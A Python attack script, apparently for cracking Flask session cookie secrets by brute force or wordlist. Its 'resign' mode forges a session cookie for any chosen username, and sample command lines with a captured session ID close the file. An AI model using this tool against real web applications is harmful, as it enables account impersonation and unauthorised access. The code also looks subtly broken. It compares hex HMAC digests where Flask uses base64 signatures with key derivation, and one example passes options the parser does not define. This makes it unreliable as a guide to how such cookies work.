import hmac
import hashlib
import base64
import json
from itertools import product
from string import ascii_letters, digits
import argparse

def generate_signature(secret_key, data):
    return hmac.new(secret_key.encode(), data.encode(), hashlib.sha1).hexdigest()

def incremental_brute_force(data, given_signature, charset, max_length, debug=False):
    for length in range(1, max_length + 1):
        for key_tuple in product(charset, repeat=length):
            key = ''.join(key_tuple)
            signature = generate_signature(key, data)
            if debug:
                print(f"Testing key: {key}")
            if signature == given_signature:
                print(f"Secret key found: {key}")
                return key
    return None

def wordlist_attack(data, given_signature, wordlist, debug=False):
    with open(wordlist, 'r') as f:
        for line in f:
            key = line.strip()
            signature = generate_signature(key, data)
            if debug:
                print(f"Testing key: {key}")
            if signature == given_signature:
                print(f"Secret key found: {key}")
                return key
    return None

def decode_session_id(session_id):
    parts = session_id.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid session ID format")
    data, timestamp, signature = parts
    decoded_data = base64.b64decode(data + '==').decode('utf-8')  # Add padding and decode
    return decoded_data, timestamp, signature

def resign_session_id(data, timestamp, secret_key):
    encoded_data = base64.b64encode(data.encode()).decode().rstrip('=')  # Remove padding
    new_signature = generate_signature(secret_key, f"{encoded_data}.{timestamp}")
    return f"{encoded_data}.{timestamp}.{new_signature}"

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Flask Session Signature Brute Force Tool")
    parser.add_argument('--mode', choices=['brute', 'wordlist', 'resign'], required=True, help="Mode of operation: 'brute' for brute force, 'wordlist' for wordlist attack, 'resign' for re-signing the session")
    parser.add_argument('--sessionid', help="Full session ID for brute force or wordlist attack")
    parser.add_argument('--charset', default=ascii_letters + digits, help="Charset to use for brute force (default: ascii letters and digits)")
    parser.add_argument('--max_length', type=int, default=8, help="Maximum length of keys to brute force (default: 8)")
    parser.add_argument('--wordlist', help="Path to the wordlist file for wordlist attack")
    parser.add_argument('--session_resign', help="New name to re-sign the session ID with")
    parser.add_argument('--debug', action='store_true', help="Enable debug mode to print tested keys")

    args = parser.parse_args()

    if args.mode in ['brute', 'wordlist']:
        if not args.sessionid:
            raise ValueError("Session ID must be provided for brute force or wordlist attack")

        data, timestamp, given_signature = decode_session_id(args.sessionid)
        full_data = f"{data}.{timestamp}"

        if args.mode == 'brute':
            secret_key = incremental_brute_force(full_data, given_signature, args.charset, args.max_length, args.debug)
        elif args.mode == 'wordlist':
            if not args.wordlist:
                raise ValueError("Wordlist file path must be provided for wordlist attack")
            secret_key = wordlist_attack(full_data, given_signature, args.wordlist, args.debug)

        if secret_key:
            print(f"Secret key successfully found: {secret_key}")
        else:
            print("Secret key not found.")

    elif args.mode == 'resign':
        if not args.sessionid or not args.session_resign:
            raise ValueError("Session ID and new name must be provided for re-signing the session")

        data, timestamp, given_signature = decode_session_id(args.sessionid)
        full_data = f"{data}.{timestamp}"

        secret_key = incremental_brute_force(full_data, given_signature, args.charset, args.max_length, args.debug)

        if secret_key:
            new_data = json.dumps({"user": args.session_resign})
            new_session_id = resign_session_id(new_data, timestamp, secret_key)
            print(f"New session ID: {new_session_id}")
        else:
            print("Secret key not found, cannot re-sign session.")


#python3 bruteforce.py --mode brute --sessionid eyJjc3JmX3Rva2VuIjoiNGFjZGQ1MTE2NTYzNmEwNzA1Zjc0M2E4MDBjMjAyYzJiYmVkZWFlZSIsIm5hbWUiOiJ0ZXN0In0.Zn2EfA.jtOjr3jSRwZM2ILAEZH2Xmg_Vdo --debug
#python3 bruteforce.py --mode wordlist --sessionid eyJjc3JmX3Rva2VuIjoiNGFjZGQ1MTE2NTYzNmEwNzA1Zjc0M2E4MDBjMjAyYzJiYmVkZWFlZSIsIm5hbWUiOiJ0ZXN0In0.Zn2EfA.jtOjr3jSRwZM2ILAEZH2Xmg_Vdo --wordlist wordlist.txt --debug
#python3 bruteforce.py --mode resign --sessionid eyJjc3JmX3Rva2VuIjoiNGFjZGQ1MTE2NTYzNmEwNzA1Zjc0M2E4MDBjMjAyYzJiYmVkZWFlZSIsIm5hbWUiOiJ0ZXN0In0.Zn2EfA.jtOjr3jSRwZM2ILAEZH2Xmg_Vdo --session_resign newuser --length 8 --processes 4
